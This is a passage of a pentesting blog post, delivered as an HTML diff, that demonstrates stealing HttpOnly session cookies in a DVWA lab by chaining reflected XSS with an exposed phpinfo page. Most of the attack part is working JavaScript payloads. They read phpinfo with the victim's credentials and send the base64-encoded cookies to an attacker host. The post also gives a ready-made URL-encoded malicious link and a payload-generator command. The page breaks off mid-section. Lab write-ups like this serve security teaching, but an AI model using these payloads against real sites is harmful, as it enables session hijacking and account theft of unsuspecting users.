@@ -1,0 +1,998 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation - hackcommander.github.io</title>
+<meta name="description" content="Pentesting article: how to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.github.io">
+<meta property="og:title" content="How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation">
+<meta property="og:url" content="https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page/">
+
+
+  <meta property="og:description" content="Pentesting article: how to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation.">
+
+
+
+  <meta property="og:image" content="https://hackcommander.github.io/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-1.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-11-12T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Iván Santos Malpica",
+      "url": "https://hackcommander.github.io",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.github.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+    
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/search/">Search</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/advertising/">Advertising</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="https://hackcommander.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#posts" itemprop="item"><span itemprop="name">Posts</span></a>
+          <meta itemprop="position" content="2">
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#2022" itemprop="item"><span itemprop="name">2022</span></a>
+          <meta itemprop="position" content="3">
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#11" itemprop="item"><span itemprop="name">11</span></a>
+          <meta itemprop="position" content="4">
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#12" itemprop="item"><span itemprop="name">12</span></a>
+          <meta itemprop="position" content="5">
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Iván Santos Malpica<br>(Aka. HackCommander)</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Mathematician and Computer Engineer / Pentester / Bug Bounty Hunter / CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+      
+      
+        <li>
+          <a href="mailto:ivansantosmalpica.contact@gmail.com">
+            <meta itemprop="email" content="ivansantosmalpica.contact@gmail.com">
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://www.linkedin.com/in/%E2%98%91iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://hackerone.com/hackcommander" target="_blank">
+            <img src="/assets/images/author-logos/hackerone.svg" alt="HackerOne" style="width: 16px; height: 16px;">
+            HackerOne
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://twitter.com/H4ckC0mm4nd3r" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+      
+      
+        
+          <li>
+            <a href="https://www.youtube.com/@ivansantosmalpica" itemprop="sameAs" rel="nofollow noopener noreferrer">
+              <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> YouTube
+            </a>
+          </li>
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+      
+      
+        <li>
+          <a href="https://tryhackme.com/p/HackCommander" target="_blank">
+            <img src="/assets/images/author-logos/tryhackme.svg" alt="TryHackMe" style="width: 15px; height: 15px;">
+            TryHackMe
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://app.hackthebox.com/profile/270539" target="_blank">
+            <img src="/assets/images/author-logos/hackthebox.svg" alt="HackTheBox" style="width: 15px; height: 15px;">
+            HackTheBox
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://www.codewars.com/users/HackCommander" target="_blank">
+            <img src="/assets/images/author-logos/codewars.svg" alt="CodeWars" style="width: 15px; height: 15px;">
+            CodeWars
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://www.buymeacoffee.com/ivansantos" target="_blank">
+            <img src="/assets/images/author-logos/buymeacoffee.svg" alt="Buy Me a Coffee" style="width: 16px; height: 16px;">
+            Buy Me a Coffee
+          </a>
+        </li>
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation">
+    <meta itemprop="description" content="Pentesting article: how to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation.">
+    <meta itemprop="datePublished" content="November 12, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-11-12T00:00:00+01:00">November 12, 2022 </time> 
+          
+          
+        </p>
+        <h2 id="summary">Summary</h2>
+
+<ul>
+  <li><a href="#section-id-1">1. Setting up the environment</a></li>
+  <li>
+<a href="#section-id-2">2. Hands-on!</a>
+    <ul>
+      <li><a href="#section-id-2-1">2.1. Trying to exfiltrate the cookies through the usual method</a></li>
+      <li><a href="#section-id-2-2">2.2. Exfiltrating the cookies bypassing the HttpOnly flag through the PHP info page</a></li>
+      <li><a href="#section-id-2-3">2.3. Using my Github tool to generate an improved payload</a></li>
+      <li><a href="#section-id-2-4">2.4. Important notes</a></li>
+    </ul>
+  </li>
+  <li><a href="#section-id-3">3. Conclusions</a></li>
+</ul>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-1.png" alt=""></p>
+
+<p>PHP info page disclosure is usually considered to be a low severity vulnerability but in this post I am going to show how to bypass the <em>HttpOnly</em> flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation. This file could be used to perform a session hijacking.</p>
+
+<p>As far as I know, the person who discovered this bypass technique was <a href="https://aleksikistauri.medium.com/bypassing-httponly-with-phpinfo-file-4e5a8b17129b">Aleksi Kistauri</a> and in this post we are going to see how to reproduce it in Metasploitable 2 with some extra requirements that I have not seen in other posts.</p>
+
+<div id="section-id-1"></div>
+
+<h2 id="1-setting-up-the-environment">1. Setting up the environment</h2>
+
+<p>We will use the intentionally vulnerable machine <em>Metasploitable 2</em>. To set up the environment follow the steps below:</p>
+
+<ol>
+  <li>
+    <p>Download the virtual machine from the link below</p>
+
+    <p><a href="https://www.vulnhub.com/entry/metasploitable-2,29/">Link to download Metasploitable 2</a></p>
+
+    <p>and import the machine in VMware. If you use VirtualBox, you can do it, the virtualization software is not relevant.</p>
+  </li>
+  <li>
+    <p>You should have another virtual machine, preferably a Kali virtual machine.</p>
+  </li>
+  <li>
+    <p>Set the network adapter of your Kali and <em>Metasploitable 2</em> as Host-only.</p>
+  </li>
+  <li>
+    <p>Run <em>Metasploitable 2</em> and log in using the credentials msfadmin:msfadmin.</p>
+  </li>
+  <li>
+    <p>Get the IP of the machine through the command ifconfig</p>
+
+    <p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/ifconfig.png" alt=""></p>
+  </li>
+  <li>
+    <p>Suposing that the IP of the <em>Metasploitable 2</em> machine is 192.168.240.129 you can access to the web from your Kali through the URL</p>
+
+    <div class="code-header">
+   <button class="copy-code-button">
+     Copy
+   </button>
+ </div>
+    <div class="language-html highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code> http://192.168.240.129/
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>In the main page select the option <em>DVWA</em>, wich is the acronym of <em>Damn Vulnerable Web Application</em></p>
+
+    <p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/main-page.png" alt=""></p>
+  </li>
+  <li>
+    <p>Log in with the credentials admin:password.</p>
+  </li>
+  <li>
+    <p>Configure the <em>Security Level</em> to <em>low</em></p>
+
+    <p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/dvwa-security.png" alt=""></p>
+
+    <p>and click <em>Submit</em>.</p>
+  </li>
+  <li>
+    <p>In the left panel select the option <em>XSS reflected</em> and write the payload</p>
+
+    <div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+    <div class="language-html highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div>    </div>
+
+    <p>in the text box as follows</p>
+
+    <p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/xss-reflected-form.png" alt=""></p>
+
+    <p>and clicking on <em>Submit</em> you will see an alert like the following</p>
+
+    <p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/xss-reflected-alert.png" alt=""></p>
+
+    <p>So there is an HTML context reflected XSS through GET method in the URL</p>
+
+    <div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+    <div class="language-html highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>To show how the PHP info page can be used to bypass the <em>HttpOnly</em> flag, we must first have at least one cookie with the <em>HttpOnly</em> flag set to <em>true</em>. In <em>Metasploitable 2</em> is not set by defaul, that’s why we have to access to the cookies in the browser (Firefox in my case) and set, for example, the <em>HttpOnly</em> of the <em>PHPSESSID</em> cookie to <em>true</em>, as you can see in the following screenshot</p>
+
+    <p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/cookies-settings.png" alt=""></p>
+  </li>
+</ol>
+
+<div id="section-id-2"></div>
+
+<h2 id="2-hands-on">2. Hands-on!</h2>
+
+<div id="section-id-2-1"></div>
+
+<h2 id="21-trying-to-exfiltrate-the-cookies-through-the-usual-method">2.1. Trying to exfiltrate the cookies through the usual method</h2>
+
+<p>A very common way to access the cookies via Javascript is through the <em>document</em> property <em>cookie</em>. So if you write the payload</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>and you click on <em>Submit</em>, you are going to see all your cookies in the screen… or not?</p>
+
+<p>If you make that, you are going to see only the <em>security</em> cookie, like in the following screenshot</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/xss-cookies-alert.png" alt=""></p>
+
+<p>but… Why are we not seeing the value of the <em>PHPSESSID</em> cookie? That’s because the value <em>true</em> in the <em>HttpOnly</em> flag of the cookie <em>PHPSESSID</em>.</p>
+
+<p><em>HttpOnly</em> is an additional flag included in a Set-Cookie HTTP response header. Using the <em>HttpOnly</em> flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie (if the browser supports it). You can check more information about the <em>HttpOnly</em> flag in the following link</p>
+
+<p><a href="https://owasp.org/www-community/HttpOnly">Link of OWASP about the HttpOnly flag</a></p>
+
+<p>For those who do not do web pentesting or who do not regularly deal with XSS, this flag may not be familiar, but for those of us who are used to looking for and reporting these vulnerabilities in bug bounty programs, this flag is the main problem we encounter when it comes to finding a real impact in an XSS.</p>
+
+<p>Take a look at the following code</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+   <span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="k">new</span> <span class="nx">Image</span><span class="p">;</span>
+   <span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://192.168.240.129/</span><span class="dl">"</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>This code is a very common way to try to exfiltrate the user cookies during an XSS exploitation. This code is executed in the client side (XSS is a client side vulnerability) and try to import a image from the IP 192.168.240.129, which is the IP of my Kali. The requested path is the user cookies encoded in <em>base64</em>. The <em>base64</em> encoding is not strictly necessary but it can be useful for passing data in URLs when the data includes non-url friendly characters.</p>
+
+<p>So if we set up a web server in our Kali through the command</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">python3 -m http.server 80
+</span></code></pre></div></div>
+
+<p>like in the following screenshot</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/python-web-server.png" alt=""></p>
+
+<p>and we write the payload</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="k">new</span> <span class="nx">Image</span><span class="p">;</span><span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://192.168.240.129/</span><span class="dl">"</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>and we click <em>Submit</em>, we can see that a GET request has been printed in the web server, like in the following screenshot</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-1.png" alt=""></p>
+
+<p>The path of the GET request is the <em>base64</em> encoded form of the user cookies, so decoding it with the burpsuite decoder we can get the user cookies</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-decoded-1.png" alt=""></p>
+
+<p>As you can see, only the <em>security</em> cookie is displayed and not the <em>PHPSESSID</em> cookie. That’s because the <em>HttpOnly</em> flag of the <em>PHPSESSID</em> cookie.</p>
+
+<div id="section-id-2-2"></div>
+
+<h2 id="22-exfiltrating-the-cookies-bypassing-the-httponly-flag-through-the-php-info-page">2.2. Exfiltrating the cookies bypassing the HttpOnly flag through the PHP info page</h2>
+
+<p>Ok, we can’t get the cookies from the <em>document</em> object. Is there another place where we can get the cookies?</p>
+
+<p>In <em>Metasploitable 2</em> there is a PHP info page disclosure in the path <em>/dvwa/phpinfo</em>. In my case, it’s in the URL</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.240.128/dvwa/phpinfo
+</code></pre></div></div>
+
+<p><a href="https://www.php.net/manual/en/function.phpinfo.php">PHP info page</a> is a page that outputs information about PHP’s configuration and is a valuable debugging tool as it contains all EGPCS (Environment, GET, POST, Cookie, Server) data. If you take a look at the page you will see that your cookies appear in several places, for example in</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-1.png" alt=""></p>
+
+<ol>
+  <li>
+    <p>Make a request to the URL</p>
+
+    <div class="code-header">
+   <button class="copy-code-button">
+     Copy
+   </button>
+ </div>
+    <div class="language-html highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>http://192.168.240.128/dvwa/phpinfo
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Take the portion of the PHP info page that contains the user cookies.</p>
+  </li>
+  <li>
+    <p>Encode this portion in <em>base64</em>.</p>
+  </li>
+  <li>
+    <p>Send this encoded string to the malicious server, that is, our Kali.</p>
+  </li>
+</ol>
+
+<p>That is what the following code does</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+   <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> <span class="c1">// Initializes the request object</span>
+   <span class="nx">req</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="nx">reqListener</span><span class="p">;</span> <span class="c1">// Set the listener reqListener that is triggered when the response is ready</span>
+   <span class="kd">var</span> <span class="nx">url</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://192.168.240.128/dvwa/phpinfo</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// Initializes the URL of the PHP info page</span>
+   <span class="nx">req</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span> <span class="c1">// Send the cookie header</span>
+   <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="nx">url</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span> <span class="c1">// The request will be sent to the PHP info page of Metasploitable 2 (192.168.240.128) through the GET method synchronously</span>
+   <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span> <span class="c1">// Send the request</span>
+   <span class="kd">function</span> <span class="nx">reqListener</span><span class="p">()</span> <span class="p">{</span>
+      <span class="kd">var</span> <span class="nx">req2</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> <span class="c1">// Initializes the request object</span>
+      <span class="kd">const</span> <span class="nx">sess</span><span class="o">=</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">HTTP_COOKIE</span><span class="dl">"</span><span class="p">));</span> <span class="c1">// Store in the variable sess the result of encoding in base64 the portion of the PHP info page between the first appearance of the word HTTP_COOKIE and the final of the page</span>
+      <span class="nx">req2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://192.168.240.129/?data=</span><span class="dl">"</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">sess</span><span class="p">),</span><span class="kc">false</span><span class="p">);</span> <span class="c1">// The request will be sent to the Kali (192.168.240.129) through the GET method synchronously</span>
+      <span class="nx">req2</span><span class="p">.</span><span class="nx">send</span><span class="p">()</span> <span class="c1">// Send the request</span>
+   <span class="p">};</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>that I have taken from the blog of Aleksi Kistauri</p>
+
+<p><a href="https://www.vulnhub.com/entry/metasploitable-2,29/">Link to Aleksi Kistauri’s blog post</a></p>
+
+<p>making some minor modifications. This code could probably be optimized to be more precise in taking the exact part of the PHP info page that contains the cookies but it would also be longer.</p>
+
+<p>So if we set up a web server in our Kali through the above command, we write the payload</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">req</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="nx">reqListener</span><span class="p">;</span><span class="kd">var</span> <span class="nx">url</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://192.168.240.128/dvwa/phpinfo</span><span class="dl">"</span><span class="p">;</span><span class="nx">req</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span><span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="nx">url</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span><span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span><span class="kd">function</span> <span class="nx">reqListener</span><span class="p">()</span> <span class="p">{</span><span class="kd">var</span> <span class="nx">req2</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="kd">const</span> <span class="nx">sess</span><span class="o">=</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">HTTP_COOKIE</span><span class="dl">"</span><span class="p">));</span><span class="nx">req2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://192.168.240.129/?data=</span><span class="dl">"</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">sess</span><span class="p">),</span><span class="kc">false</span><span class="p">);</span><span class="nx">req2</span><span class="p">.</span><span class="nx">send</span><span class="p">()};</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>and we click on <em>Submit</em>, we can see that a GET request has been printed in the web server, like in the following screenshot</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-2.png" alt=""></p>
+
+<p>The value of the parameter <em>data</em> is the <em>base64</em> encoded form of the user cookies (and a lot of HTML code but not relevant), so decoding it with the burpsuite decoder we can get the user cookies</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-decoded-2.png" alt=""></p>
+
+<p>As you can see, all the cookies has been displayed, so we have bypassed the <em>HttpOnly</em> flag of the <em>PHPSESSID</em> cookie. Therefore, anyone who clicks on the URL</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Evar+req+%3D+new+XMLHttpRequest%28%29%3Breq.onload%3DreqListener%3Bvar+url%3D%22http%3A%2F%2F192.168.240.128%2Fdvwa%2Fphpinfo%22%3Breq.withCredentials%3Dtrue%3Breq.open%28%22GET%22%2Curl%2Cfalse%29%3Breq.send%28%29%3Bfunction+reqListener%28%29+%7Bvar+req2%3Dnew+XMLHttpRequest%28%29%3Bconst+sess%3Dthis.responseText.substring%28this.responseText.indexOf%28%22HTTP_COOKIE%22%29%29%3Breq2.open%28%22GET%22%2C%22http%3A%2F%2F192.168.240.129%2F%3Fdata%3D%22%2Bbtoa%28sess%29%2Cfalse%29%3Breq2.send%28%29%7D%3B%3C%2Fscript%3E#
+</code></pre></div></div>
+
+<p>will be sending us their cookies associated with <em>DVWA</em>, including the session cookie and therefore we will have achieved a session hijacking.</p>
+
+<p>Obviously this is a test environment and no one is going to click on that link except me, and even if someone did click on it nothing would happen because that IP address is a private IP address. But imagine this situation in a public website of an important company and an attacker sending a link like this using social engineering through Twitter, Linkedin, Facebook… and sending the user’s cookies to an own server.</p>
+
+<p>Do you still think that PHP info page disclosure is not an important vulnerability?</p>
+
+<div id="section-id-2-3"></div>
+
+<h2 id="23-using-my-github-tool-to-generate-an-improved-payload">2.3. Using my Github tool to generate an improved payload</h2>
+
+<p>As you can see, the payload used in the previous section is not quite accurate since it returns not only cookies but also a lot of non-relevant HTML code. That is why I have uploaded the following tool to Github</p>
+
+<p><a href="https://github.com/HackCommander/PHP-info-cookie-stealer">Link to the tool PHP-info-cookie-stealer</a></p>
+
+<p>To avoid repeating the same thing, if you want to know how the tool works you can see the README.md and you can give a star to the project <img class="emoji" title=":blush:" alt=":blush:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f60a.png" height="20" width="20">. In this case, cloning the repo and running the following command</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">./generate-javascript-payload.sh http://192.168.240.128/dvwa/phpinfo.php http://192.168.240.129/
+</span></code></pre></div></div>
+
+<p>you will get the following XSS payload</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
